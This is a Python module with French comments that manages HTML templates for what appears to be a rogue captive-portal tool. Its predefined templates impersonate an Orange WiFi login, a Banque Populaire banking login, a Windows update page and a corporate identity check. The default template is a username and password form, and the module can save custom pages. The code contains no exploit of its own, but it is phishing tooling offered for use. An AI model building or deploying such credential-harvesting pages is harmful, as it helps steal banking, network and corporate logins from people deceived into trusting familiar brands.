#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Gestionnaire de templates HTML pour les portails captifs
"""

import os
import json
from pathlib import Path

class TemplateManager:
    """Gestionnaire de templates HTML pour les portails captifs"""
    
    def __init__(self):
        self.templates_dir = Path(__file__).parent.parent / "templates"
        self.templates = {}
        self.load_templates()
    
    def load_templates(self):
        """Charge tous les templates disponibles"""
        try:
            # Templates prédéfinis
            self.templates = {
                "wifi_login": {
                    "name": "Connexion WiFi Orange",
                    "description": "Page de connexion WiFi professionnelle",
                    "file": "wifi_login.html",
                    "category": "wifi"
                },
                "free_wifi": {
                    "name": "WiFi Gratuit",
                    "description": "Page de connexion WiFi gratuite",
                    "file": "free_wifi.html",
                    "category": "wifi"
                },
                "bank_login": {
                    "name": "Banque Populaire",
                    "description": "Page de connexion bancaire sécurisée",
                    "file": "bank_login.html",
                    "category": "banking"
                },
                "update_required": {
                    "name": "Mise à jour Windows",
                    "description": "Page de mise à jour système critique",
                    "file": "update_required.html",
                    "category": "system"
                },
                "verification_required": {
                    "name": "Vérification Entreprise",
                    "description": "Page de vérification d'identité entreprise",
                    "file": "verification_required.html",
                    "category": "enterprise"
                }
            }
            
            # Chargement des fichiers HTML
            for template_id, template_info in self.templates.items():
                file_path = self.templates_dir / template_info["file"]
                if file_path.exists():
                    with open(file_path, 'r', encoding='utf-8') as f:
                        template_info["content"] = f.read()
                else:
                    template_info["content"] = self.get_default_template()
                    
        except Exception as e:
            print(f"Erreur lors du chargement des templates: {e}")
    
    def get_default_template(self):
        """Retourne un template par défaut"""
        return """
<!DOCTYPE html>
<html>
<head>
    <title>Connexion WiFi</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 0; padding: 20px; background: #f0f0f0; }
        .container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        h1 { text-align: center; color: #333; }
        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; }
        button:hover { background: #0056b3; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Connexion WiFi</h1>
        <form method="post" action="/login">
            <input type="text" name="username" placeholder="Nom d'utilisateur" required>
            <input type="password" name="password" placeholder="Mot de passe" required>
            <button type="submit">Se connecter</button>
        </form>
    </div>
</body>
</html>
"""
    
    def get_template(self, template_id):
        """Récupère un template par son ID"""
        return self.templates.get(template_id, {}).get("content", self.get_default_template())
    
    def get_template_info(self, template_id):
        """Récupère les informations d'un template"""
        return self.templates.get(template_id, {})
    
    def get_all_templates(self):
        """Retourne tous les templates disponibles"""
        return self.templates
    
    def get_templates_by_category(self, category):
        """Retourne les templates d'une catégorie spécifique"""
        return {k: v for k, v in self.templates.items() if v.get("category") == category}
    
    def create_custom_template(self, template_id, name, description, content, category="custom"):
        """Crée un template personnalisé"""
        self.templates[template_id] = {
            "name": name,
            "description": description,
            "content": content,
            "category": category,
            "custom": True
        }
        return True
    
    def save_template_to_file(self, template_id, filename=None):
        """Sauvegarde un template dans un fichier"""
        try:
            template = self.templates.get(template_id)
            if not template:
                return False
            
            if not filename:
                filename = f"{template_id}.html"
            
            file_path = self.templates_dir / filename
            with open(file_path, 'w', encoding='utf-8') as f:
                f.write(template["content"])
            
            return True
        except Exception as e:
            print(f"Erreur lors de la sauvegarde du template: {e}")
            return False
    
    def get_template_categories(self):
        """Retourne toutes les catégories disponibles"""
        categories = set()
        for template in self.templates.values():
            categories.add(template.get("category", "other"))
        return list(categories)
    
    def search_templates(self, query):
        """Recherche des templates par nom ou description"""
        results = {}
        query = query.lower()
        
        for template_id, template in self.templates.items():
            if (query in template.get("name", "").lower() or 
                query in template.get("description", "").lower()):
                results[template_id] = template
        
        return results 